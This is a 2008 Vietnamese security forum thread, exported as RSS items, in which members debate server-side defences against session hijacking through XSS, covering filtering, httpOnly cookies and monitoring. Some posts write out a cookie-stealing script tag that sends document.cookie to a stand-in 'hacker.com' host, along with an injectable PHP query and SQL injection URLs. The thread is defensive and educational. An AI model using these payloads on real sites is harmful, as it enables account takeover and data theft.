				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#116094</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#116094</link>
				<pubDate><![CDATA[Fri, 22 Feb 2008 12:57:18]]> GMT</pubDate>
				<author><![CDATA[ boom_jt]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">boom_jt wrote:</cite><br>
		<blockquote>
Hướng thứ nhất của vivashadow thì đã có bàn ở trên, còn hướng thứ 2, bạn có thể nói rõ thêm về việc "Yêu cầu client lưu trữ và trả lời server thông tin về last request (url, timestamp)" Vì thực chất có lẽ nó cũng không giúp đc gì, vì cái gì thực hiện ở client thì cũng đều có thể bypass được, ngoài ra cơ chế cho việc client làm như vậy là gì?
&nbsp;
		</blockquote>
Cơ chế là Server sinh ra một thứ tương tự như session id của cookie rồi dùng (kèm thêm) một trong các pp được gọi chung là <font color='orange'><b>Cookies Alternation</b></font>:URL (query string), Hidden form fields, Client-side persistence,..
để lưu trữ sau đó dùng để xác nhận kèm theo coockie.

<p></p>
		<cite class="blockquote">boom_jt wrote:</cite><br>
		<blockquote>
<font color='orange'>Việc confirm thì có lẽ diễn đàn thực hiện khá ok rồi</font>, theo mình biết thì với cookie của mod/admin thì kẻ tấn công có thể sửa, xoá bài, vào đuợc các khu vực chỉ dành cho mod/admin trên diễn đàn, và không thể vào đc cp để thực hiện các chức năng cao hơn (đúng ko nhỉ :-/)
&nbsp;
		</blockquote>
Đúng hay không chỉ có mod và admin biết, dân thường sao biết dc. Mình chỉ nêu ra để nhắc thôi. Mà hình như  bạn hiểu chưa rõ việc <b>confirm</b> mình nêu. Ý mình là mỗi thao tác quan trọng như del move chủ đề đều bắt buộc nhập lại pass, nếu attacker có lấy dc cookie thì cũng chỉ để quậy lặc vặc thôi nên dễ dàng khôi phục.

Ngoài ra để chống lấy cookie bằng javascript có thể dùng cờ <font color='orange'><b>httpOnly</b></font> (hạn chế vì chưa tương thích toàn bộ các trình duyệt)]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#116097</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#116097</link>
				<pubDate><![CDATA[Fri, 22 Feb 2008 13:01:52]]> GMT</pubDate>
				<author><![CDATA[ vivashadow]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ hì, mình hiểu việc confirm nhập pass chứ ^_^

<blockquote> để lưu trữ sau đó dùng để xác nhận kèm theo coockie. &nbsp;
		</blockquote>
cái gì đã lưu trữ ở client và sau đó xác nhận kèm theo cookie cũng đều có thể lấy được bằng XSS :P

Mình sẽ tìm hiểu về httpOnly xem sao, cảm ơn bạn nha :)

p/s: cảm ơn gamma vì cái tài liệu nha, quả thật việc dùng xss và csrf để getroot làm mình khá bất ngờ, nhất định sẽ đọc! :D]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#116105</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#116105</link>
				<pubDate><![CDATA[Fri, 22 Feb 2008 13:18:59]]> GMT</pubDate>
				<author><![CDATA[ boom_jt]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">boom_jt wrote:</cite><br>
		<blockquote>Lọc đầu vào (từ người dùng) quan trọng hơn chứ :D (trường hợp tổng quát nói chung với các website nhé ^_^)
lọc đầu ra có vẻ ít khả thi do <font color='orange'>khó nhận biết đoạn code nào</font> đã bị inject trong cả 1 trang html. (cũng có thể đc, ví dụ: lọc các thẻ html "có vấn đề" nằm trong &lt;div&gt;[bài viết]&lt;/div&gt; của 1 bài viết trên forum chẳng hạn, nhưng đây là trường hợp không tổng quát ...)&nbsp;
		</blockquote>
sao lại khó nhỉ? cái nào nhận từ $_GET, $_POST từ người dùng thì trước khi cho nó là "đầu ra" mới lọc thôi, chứ lọc tất cả đầu vào thì hơi thừa rồi nhá :D (tất nhiên là đang nói XSS, chứ SQL ij hay command injection mà làm kiểu này thì tiêu )]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#116111</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#116111</link>
				<pubDate><![CDATA[Fri, 22 Feb 2008 13:29:09]]> GMT</pubDate>
				<author><![CDATA[ gamma95]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">gamma95 wrote:</cite><br>
		<blockquote><p></p>
		<cite class="blockquote">boom_jt wrote:</cite><br>
		<blockquote>Lọc đầu vào <b><font color='orange'>(từ người dùng)</font></b> quan trọng hơn chứ :D (trường hợp tổng quát nói chung với các website nhé ^_^)
lọc đầu ra có vẻ ít khả thi do <font color='orange'>khó nhận biết đoạn code nào</font> đã bị inject trong cả 1 trang html. (cũng có thể đc, ví dụ: lọc các thẻ html "có vấn đề" nằm trong &lt;div&gt;[bài viết]&lt;/div&gt; của 1 bài viết trên forum chẳng hạn, nhưng đây là trường hợp không tổng quát ...)&nbsp;
		</blockquote>
sao lại khó nhỉ? cái nào nhận từ $_GET, $_POST từ người dùng thì <font color='orange'><b>trước khi cho nó là "đầu ra"</b></font> mới lọc thôi, chứ lọc tất cả đầu vào thì hơi thừa rồi nhá :D (tất nhiên là đang nói XSS, chứ SQL ij hay command injection mà làm kiểu này thì tiêu )&nbsp;
		</blockquote>

Thì ý mình nào có khác, vấn đề gamma nói vẫn là lọc đầu vào từ người dùng đó thôi :P]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#116114</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#116114</link>
				<pubDate><![CDATA[Fri, 22 Feb 2008 13:38:14]]> GMT</pubDate>
				<author><![CDATA[ boom_jt]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ @boom_it: hehe, vấn đề lọc đầu vào ko phải lúc nào cũng đơn giản đâu, đồng chí có tin là tui demo một đoạn mã bị sql injection rõ ràng mà ko coder lúng túng ko biết lọc đầu vào làm sao ko ?
:D
XSS cũng vậy thôi, có nhiều trường hợp source code phía website nó <font color='orange'>echo $_input</font> ngay trong thẻ <font color='orange'>&lt;script&gt;</font> sẵn rồi, attacker ko cần chèn thêm thẻ <font color='orange'>&lt;script&gt;</font> mới khai thác đc, lúc chỉ chỉ cần input= foo; window.location, window.open gì đó là done thôi :D ... Lúc đó thì lọc thể nào ?? chả nhẽ lọc hết javascript function ??? :D]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#116116</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#116116</link>
				<pubDate><![CDATA[Fri, 22 Feb 2008 13:46:51]]> GMT</pubDate>
				<author><![CDATA[ gamma95]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía server</title>
				<description><![CDATA[ thế lọc hết Javasript funtion thì có bị làm sao ko?
ko biết thật, chứ ko phải spam!]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#116117</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#116117</link>
				<pubDate><![CDATA[Fri, 22 Feb 2008 13:53:29]]> GMT</pubDate>
				<author><![CDATA[ mR.Bi]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ hì hì, bồ cứ đưa đoạn mã bị sql inj, mình đảm bảo fix đc á :P

xss như đoạn bồ vừa nói là 1 trường hợp rất hay, (cũng filter đc chớ :P giả dụ ko cho thực hiện câu javascript tiếp theo bằng dấu ; - js mà ko có ; thì có thực hiện tiếp đc ko nhỉ :-/)
@mR.Bi: lọc hết js thì mất hết hay của web rùi còn gì :D]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#116119</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#116119</link>
				<pubDate><![CDATA[Fri, 22 Feb 2008 13:57:33]]> GMT</pubDate>
				<author><![CDATA[ boom_jt]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía server</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">Look2Me wrote:</cite><br>
		<blockquote>Webserver không mắc lỗi XSS và là website mắc lỗi.
Để ngăn XSS từ phía server thì 1 cách hay nhất là dựa trên địa chỉ IP. Tuy nhiên nó lại gặp hạn chế với hệ thống mạng sử dụng load balancing.
=&gt; Chịu! Control code website cho tốt thôi, có thể sử dụng 1 trang filter để lọc tất cả các tham số đầu vào cho hệ thống.&nbsp;
		</blockquote>

Website hosting trong một webserver, vì vậy nói webserver có lỗi <font color='yellow'>là nói tổng quát, khi đề cập đến 3 thành phần tham gia để lỗi XSS phát huy tác dụng</font>.  Một webserver có thể có nhiều website và nhiều website có thể cùng mắc lỗi XSS. Ngoài ra còn có trường hợp như gamma95 thông báo.

<font color='yellow'> Không thể dùng source IP của user </font>làm thông số để detect và  ngăn một user (dùng HTTP header trong đó có cookie chiếm đoạt từ lỗi XSS trên webserver) kết nối vào chính webserver này, vì có rất nhiều nguyên nhân, thí dụ.
- ISP sử dụng Gateway-Proxy

-  Các user luôn đựoc ISP cấp một Dynamic WAN IP
- Hai user cùng trong một mạng LAN lớn, dùng chung một ADSL modem. Trong đó có một người là hacker
 ...vân vân. 

 Lọc thông số đầu vào cụ thể là lọc cái gì? Ý bạn nói là Content Filter? Nhưng những thông số trong gói HTTP header     (<i>bị chiếm đọat và đựoc hacker tái sử dụn</i>g) <font color='yellow'>là hợp lệ cơ mà</font>? Vậy thì lọc cái gì?
 Tôi sẽ viết tiếp bài viết tôi đang viết dở dang ở post trên
]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#116122</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#116122</link>
				<pubDate><![CDATA[Fri, 22 Feb 2008 14:03:44]]> GMT</pubDate>
				<author><![CDATA[ PXMMRF]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">boom_jt wrote:</cite><br>
		<blockquote>hì hì, bồ cứ đưa đoạn mã bị sql inj, mình đảm bảo fix đc á :P

xss như đoạn bồ vừa nói là 1 trường hợp rất hay, (cũng filter đc chớ :P giả dụ ko cho thực hiện câu javascript tiếp theo bằng dấu ; - js mà ko có ; thì có thực hiện tiếp đc ko nhỉ :-/)
@mR.Bi: lọc hết js thì mất hết hay của web rùi còn gì :D&nbsp;
		</blockquote>
hehe, XSS mà bồ đi lọc dấu chấm phẩy àh? Hay là thấy trường hợp của tui rồi mới nảy ra ý lọc dấu chấm phẩy (j/k). 
Còn đoạn code bị SQL injection là thế này đây
Tui có một website về 1 giải bóng đá (WC 2010) chẳng hạn:
giải đấu được chia ra làm <font color='red'>10000</font> bảng: #:S
muốn xem thông tin các đội trong 1 bảng, ví dụ bảng A đi: thì truy cập URL:<span class="link"> http://football.com/info.php?table=A</span>
trong source-code
<font color='orange'>$sql="select * from $_GET[table]";</font>
.......
hehe, lúc đó hacker tấn công SQL injection ở mức cơ bản
<font color='orange'>http://football.com/info.php?table=Admin</font>
hoặc
<font color='orange'>http://football.com/info.php?table=Infomation_schema.tables</font>
.....
thì bồ xây dựng bộ lọc SQL injection trong trường hợp này thế nào ??  :D 
@vivashadow: Bồ làm một bài về httpOnly đi, tui có nhiều thắc mắc về nó :D  ]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#116125</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#116125</link>
				<pubDate><![CDATA[Fri, 22 Feb 2008 14:05:19]]> GMT</pubDate>
				<author><![CDATA[ gamma95]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ <blockquote> @mR.Bi: lọc hết js thì mất hết hay của web rùi còn gì&nbsp;
		</blockquote>

thế ko phải các bác đang lọc đầu vào à? "đầu vào" ở đây là việc input các Script mang tính dung hại từ phía user cơ mà, có liên quan gì tới web đâu nhở :-/ ]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#116128</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#116128</link>
				<pubDate><![CDATA[Fri, 22 Feb 2008 14:10:20]]> GMT</pubDate>
				<author><![CDATA[ mR.Bi]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía server</title>
				<description><![CDATA[ Lạc đề rồi, session hijack mà.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#116130</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#116130</link>
				<pubDate><![CDATA[Fri, 22 Feb 2008 14:12:13]]> GMT</pubDate>
				<author><![CDATA[ vivashadow]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ Hì hì, tất nhiên thấy được nguy cơ thì mới đề ra giải pháp, cái ; là từ trường hợp của bồ đưa ra :D :"&gt;

Ví dụ sql inj của bồ rất hay!! Nói chuyện với gamma thích ghê, lúc nào cũng có cái cho mình học tập á :D
Với trường hợp như vậy thì người lập trình phải nghĩ đến khả năng bị select từ bảng khác, và làm 1 cái kiểm tra $_GET[table] có thuộc vào A,B,C... (đến 10 bảng là kí tự nào ha :"&gt;). Tất nhiên cách kiểm tra này cũng chỉ dùng trong trường hợp cụ thể của bồ, cũng giống như lỗi LFI thì cũng phải kiểm tra xem tên file truyền từ người dùng có ok ko ý mà :D ]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#116131</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#116131</link>
				<pubDate><![CDATA[Fri, 22 Feb 2008 14:12:28]]> GMT</pubDate>
				<author><![CDATA[ boom_jt]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía server</title>
				<description><![CDATA[  Vâng tôi xin viết tiếp bài post còn viết chưa xong ở trên.
Nhưng trước hết xin các bạn đọc kỹ vấn đề mà anh conmale đặt ra và đề nghị thảo luận. Tránh đi lạc đề, thí dụ lại bàn về Sql injection vulnerabilities. Trong khi lỗi SQL injection khác hoàn toàn với lỗi XSS về rất nhiều mặt.
 Coi chừng có bạn chưa đọc gì về XSS mà cứ cho nhiều ý kiến quá. Bản thân tôi đã đọc rất nhiều tài liệu về XSS từ cách đây 2-3 năm cho đến nay và check nhiều website phát hiện ra lỗi XSS, mà bản thân tôi thú thực cũng không hiểu nhiều, kỹ về XSS. Nó quá phức tạp và rối rắm.
<font color='yellow'>
 Thôi thì có bạn nào hiểu kỹ về XSS thì viết bổ sung cho phần định nghĩa, mô tả, phân loại và nguyên tắc hoạt động của từng loại XSS. Thank you in advance!
    Tôi xin viết tiếp bài trên, đi ngay vào vấn đề anh conmale đề câp. Còn các nôi dung bổ sung kiến thức về XSS sẽ nhờ các bạn khác bổ sung, như nói ở trên.</font>

  Trong khi <font color='orange'>HVA chúng ta chưa có thời gian và điều kiện  phát hiện hết các lỗi XSS tồn tại ở các URL, khu vực khác nhau của Website-webserver</font>, thì theo tôi để tránh tác hại của của việc hacker "chôm " đựoc  HTTP header+cookie của một Vmod, Mod nào đó thông qua lỗi XSS của HVA forum, rồi tái sử dụng nó ngay trong phiên kết nối còn giá trị, kết nối vào HVA, ta nên có các biện pháp sau;
 
1-  <font color='yellow'>Hạn chế quyền của VMod và Mod, đặc biệt trong việc "xóa" bài</font>. Thí dụ chỉ cho phép Vmod hay Mod xóa nhiều nhất là 5 post trong một phiên kết nối và hoàn toàn không có quyền xóa toàn bộ một topic, cũng như chỉ cho phép "ban" hay "warning" tối đa 1 nick trong một phiên kết nối. (Thưc ra quyền hạn của Mod hay VMod trong HVA vốn cũng đã hạn chê).

2- Khi chỉ xem forum, post bài, <font color='yellow'>các Admin. không nên truy cập vào HVA forum dứoi nickname- password của một Administrator, với quyền hạn như của một "root</font>", mà chỉ nên truy cập vào dưới nickname và password với quyền hạn như của một Mod. Còn khi config. lại Forum mới dùng quyền của Admin-root.

Còn để  có cơ may phát hiện ra khả năng một hacker sử dụng HTTP header+cookie chiếm đoạt để tái truy cập vào HVA forum thì theo tôi có thể thử dùng vài cách sau:

1- Áp dụng suy luận "ngoại phạm" hay "nôi phạm" gì đó của bên công an điều tra. Nghĩa là về nguyên tắc một user, tại một thời điểm xác định (theo Date và Time của Server) thì không thể cùng có mặt tại hai URL khác nhau. Ở đây có thể cải tiến tiện ích hiện hữu vốn rất hay của HVA forum là <font color='yellow'>"ai đang làm gì, ở đâu</font>" để phát hiện ra hacker.

2- Cải tiến một tiện ích Monitoring user hay đựoc cài trên các Website, từ đó phát hiện ra một nickname nào đó <font color='yellow'>lại dùng các OS, trình duyệt... khác nhau</font> trong cùng một phiên kết nối. Từ đó phát hiện khả năng nickname này đang bị chiếm đoạt.

3- Config Webserver-forum (vì Webserver của HVA chỉ hosting một HVA forum) để không cho phép một user đã truy cập thành công vào forum, lại có thể truy cập tiếp lần thứ hai vào forum.

  <i>Tuy nhiên cả hai cách 1-2 nói trên sẽ có một hạn chế trong trừong hợp là: hacker truy cập đến máy trong khi user thưc còn "đứng" trong forum, nhưng ngay sau đó thì user thưc lại tắt kết nối vào HVA forum mà không làm thủ tục "Đăng xuất", như ta vẫn hay thường làm như vậy.</i>

 Còn để đề phòng cũng có các biện pháp sau:

 - Không cho users có thể  <font color='yellow'>insert các image hosted trên  webserver khác  vào HVA forum</font>, đặc biệt vào các chỗ nhạy cảm, dễ có lỗi XSS, thí dụ như tại nơi đặt "signature".

 - Tại các chỗ nhạy cảm nói trên , thâm chí không cho phép <font color='yellow'>đặt môt link (dưới bất cứ hình thức nào) để có thể kết nối với một website bên ngoài</font>, dù user có click chuột hay không.

- <font color='yellow'>Thiết lập một cơ chế kiểm soát HVA forum từ một Webserver bên ngoài</font>, bao quát mọi HVA forum URL. Lắp đặt các tiện ích monitoring để phát hiện Hijacking lơi dụng lỗi XSS. Tuy nhiên chi tiết việc này xin phép không nói rõ. (<i>Việc này cách đây<b><font color='yellow'> 2 năm </font></b>tôi cũng đã đề cập với anh conmale. Anh đã tán thành, bàn cách làm. Nhưng vì bận quá và thấy chưa thật cần nên chúng tôi cũng lười chưa làm)</i>
]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#116149</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#116149</link>
				<pubDate><![CDATA[Fri, 22 Feb 2008 15:37:37]]> GMT</pubDate>
				<author><![CDATA[ PXMMRF]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">gamma95 wrote:</cite><br>
		<blockquote>
Đối với XSS thì <font color='orange'>lọc đầu vào</font> quan trọng hay <font color='orange'>lọc đầu ra</font> quan trọng nhỉ ? 
 :D &nbsp;
		</blockquote>
  
 Lão gamma95 luôn đặt ra những câu hỏi thông minh, ý nhị và đượm chút láu lỉnh.

 Vậy thì giống như ta vào một cửa hàng mua đồ, nhưng cửa hàng nhiều bụi. Nên chủ cửa hàng thiết kế một hệ thống hút bụi đặt ngoài cửa và hệ thống này sẽ có nhiệm vụ hút hết bụi bậm trên quần áo khách hàng lúc ra khỏi cửa hàng?. Hì hì.

 Nhưng xin hỏi lại gamma95 một câu để đựoc chỉ giáo, là: Trong quá trình nạn nhân (thành phần thứ 2) "chủ động" kết nối đến một Webserver độc hại, có "cơ cấu" chôm HTTP header+cookie, (<i>bằng cách vô tình click chuột vào một link nào đấy trên HVA forum</i>), hay "bị động" bị dẫn đến đó, <font color='yellow'>thì cái "khối" HTTP header+cookie của nạn nhân vừa truy cập vào HVA ấy, nó "nằm" (located) ở đâu? Trên HVA forum hay trên máy của nạn nhân</font>? trứoc khi nó bị chuyển về Webserver độc hại.

 Thanks for your reply!]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#116175</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#116175</link>
				<pubDate><![CDATA[Fri, 22 Feb 2008 17:44:28]]> GMT</pubDate>
				<author><![CDATA[ PXMMRF]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ Ok, nói qua về HttpOnly như vivashadow đã đề cập nhé. Cũng phải xin lỗi các bác 1 chút vì theo mình thì đây vẫn là giải pháp nặng về phía client (có nghĩa là có thể lạc với yêu cầu "server" của bác conmale)

HttpOnly là 1 trường cookie được thêm vào kể từ MS Internet Explorer 6 SP1. Khi set trường này, thì browser hỗ trợ cờ này sẽ ko cho phép javascript truy cập vào document.cookie -&gt; loại bỏ khả năng lấy cookie.

Với Firefox, mình có thấy 1 extention tương tự như vậy (cũng mang tên HttpOnly): https://addons.mozilla.org/en-US/firefox/addon/3629 mọi người thử xem nhé :)

tham khảo: http://msdn2.microsoft.com/en-us/library/ms533046.aspx]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#116185</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#116185</link>
				<pubDate><![CDATA[Fri, 22 Feb 2008 18:36:34]]> GMT</pubDate>
				<author><![CDATA[ boom_jt]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">PXMMRF wrote:</cite><br>
		<blockquote><p></p>
		<cite class="blockquote">gamma95 wrote:</cite><br>
		<blockquote>
Đối với XSS thì <font color='orange'>lọc đầu vào</font> quan trọng hay <font color='orange'>lọc đầu ra</font> quan trọng nhỉ ? 
 :D &nbsp;
		</blockquote>
  
 Lão gamma95 luôn đặt ra những câu hỏi thông minh, ý nhị và đượm chút láu lỉnh.

 Vậy thì giống như ta vào một cửa hàng mua đồ, nhưng cửa hàng nhiều bụi. Nên chủ cửa hàng thiết kế một hệ thống hút bụi đặt ngoài cửa và hệ thống này sẽ có nhiệm vụ hút hết bụi bậm trên quần áo khách hàng lúc ra khỏi cửa hàng?. Hì hì.

 Nhưng xin hỏi lại gamma95 một câu để đựoc chỉ giáo, là: Trong quá trình nạn nhân (thành phần thứ 2) "chủ động" kết nối đến một Webserver độc hại, có "cơ cấu" chôm HTTP header+cookie, (<i>bằng cách vô tình click chuột vào một link nào đấy trên HVA forum</i>), hay "bị động" bị dẫn đến đó, <font color='yellow'>thì cái "khối" HTTP header+cookie của nạn nhân vừa truy cập vào HVA ấy, nó "nằm" (located) ở đâu? Trên HVA forum hay trên máy của nạn nhân</font>? trứoc khi nó bị chuyển về Webserver độc hại.

 Thanks for your reply!&nbsp;
		</blockquote>
Chào bác PXM
cookie thì nằm trên máy nạn nhân, còn bản thân cái khối HTTP Header của HVA thì ko lấy được vì bản thân khi cookie bay vế host của Attacker + kèm theo HTTP header truy cập đến host Attacker mà thôi ( tuy nhiên trong HTTP Header này chứa một số thông tin quan trọng như User-Agent, Referer (từ HVA) ...) Chừng đó thông tin cũng đủ để Attacker giả mạo HTTP Header hợp lệ đến HVA để bypass qua một số bước check ( như comboHash chẳng hạn).
ko biết cháu trả lời thế đúng ý bác PMX ko?
Còn về giải pháp HttpOnly cũng<font color='yellow'> ko phải </font>là một giải pháp toàn diện, vì trong một số trường hợp cụ thể, nó vẫn có thể bị bypass :D

]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#116190</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#116190</link>
				<pubDate><![CDATA[Fri, 22 Feb 2008 18:50:00]]> GMT</pubDate>
				<author><![CDATA[ gamma95]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">gamma95 wrote:</cite><br>
		<blockquote>
cookie thì nằm trên máy nạn nhân, còn bản thân cái khối HTTP Header của HVA thì ko lấy được vì bản thân khi cookie bay vế host của Attacker + kèm theo HTTP header truy cập đến host Attacker mà thôi ( tuy nhiên trong HTTP Header này chứa một số thông tin quan trọng như User-Agent, Referer (từ HVA) ...) Chừng đó thông tin cũng đủ để Attacker giả mạo HTTP Header hợp lệ đến HVA để bypass qua một số bước check ( như comboHash chẳng hạn).
ko biết cháu trả lời thế đúng ý bác PMX ko?
Còn về giải pháp HttpOnly cũng <font color='orange'><b>ko phải là một giải pháp[color=yellow] ko </font>toàn diện</b>[/color], vì trong một số trường hợp cụ thể, nó vẫn có thể bị bypass :D

&nbsp;
		</blockquote>

ý bác là HttpOnly là giải pháp ko toàn diện đúng ko :D nếu thế thì hoàn toàn đồng ý với bác ^_^]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#116193</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#116193</link>
				<pubDate><![CDATA[Fri, 22 Feb 2008 19:02:18]]> GMT</pubDate>
				<author><![CDATA[ boom_jt]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">gamma95 wrote:</cite><br>
		<blockquote>  
 Chào bác PXM
cookie thì nằm trên máy nạn nhân, còn bản thân cái khối HTTP Header của HVA thì ko lấy được vì bản thân khi cookie bay vế host của Attacker + kèm theo HTTP header truy cập đến host Attacker mà thôi ( tuy nhiên trong HTTP Header này chứa một số thông tin quan trọng như User-Agent, Referer (từ HVA) ...) Chừng đó thông tin cũng đủ để Attacker giả mạo HTTP Header hợp lệ đến HVA để bypass qua một số bước check ( như comboHash chẳng hạn).
ko biết cháu <b><font color='yellow'>trả lời thế đúng ý bác PMX ko</font></b>?
Còn về giải pháp HttpOnly cũng<font color='yellow'> ko phải </font>là một giải pháp toàn diện, vì trong một số trường hợp cụ thể, nó vẫn có thể bị bypass :D

&nbsp;
		</blockquote>

  Đúng quá đi chứ! Đúng là đúng với thưc tê, chứ không phải với ý của tôi. Tôi chỉ biết hỏi thôi mà! Hì hì.
   
Nhưng mà nếu như vậy:

 - Để khắc phục, hay loại trừ lỗi XSS (gây tổn hại cho nạn nhân) <font color='yellow'>thì có cần, hay có nên lọc "đầu vào" và "đầu ra" của HVA forum  hay không?. Nếu "yes" thì nên lọc cái gì?</font>

 - <font color='yellow'>Nguyên nhân cụ thể nào khiến cho trình duyệt của ta lại "chịu" hay "phải" gửi cookie </font>(cookie truy cập thành công vào HVA, có giá trị cho một phiên kết nối hiện hành vào HVA, thường lưu trữ trong Internet Temp. files của máy ta) <font color='yellow'>đến Webserver độc hại</font>, cùng với "HTTP GET header" truy cập đến webserver độc hại này? (<i>Còn lỗi gốc là lỗi XSS trên HVA forum rồi đấy</i>.)
 Cụ thể hơn là trình duyệt của ta lúc truy cập vào nơi có XSS vulnerability <font color='yellow'>thì có chịu những "ảnh hưởng", "tổn thưong" gì hay không? Tổn thương ở đâu và tai sao?</font>

Xin chỉ giáo tiếp!


]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#116200</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#116200</link>
				<pubDate><![CDATA[Fri, 22 Feb 2008 19:24:45]]> GMT</pubDate>
				<author><![CDATA[ PXMMRF]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ @bác PXM:
cháu ví dụ:
HVA bị XSS và hacker chèn đoạn này vào chữ ký:
&lt;script&gt; window.location="http://hacker.com/cookie.php?cookie="+document.cookie;&lt;/script&gt;
thì bản thân function "document.cookie" có chức năng đọc cookie của HVA, sau đó giá trị của cookie đóng vai trò là một @argument và gửi đến script đọc giá trị @argument đó và ghi vào file log.txt của hacker thôi. Còn câu hỏi của bác PMX là có chịu tổn thương gì ko thì theo cháu muốn trả lời được thì phải xem XSS ngoài chuyện lấy cookie ra thì có thể làm đc những gì? Ví dụ như Phishing, pharming, cài mã độc, hay dùng những 0-day exploit của browser etc ??]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#116205</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#116205</link>
				<pubDate><![CDATA[Fri, 22 Feb 2008 20:05:54]]> GMT</pubDate>
				<author><![CDATA[ gamma95]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
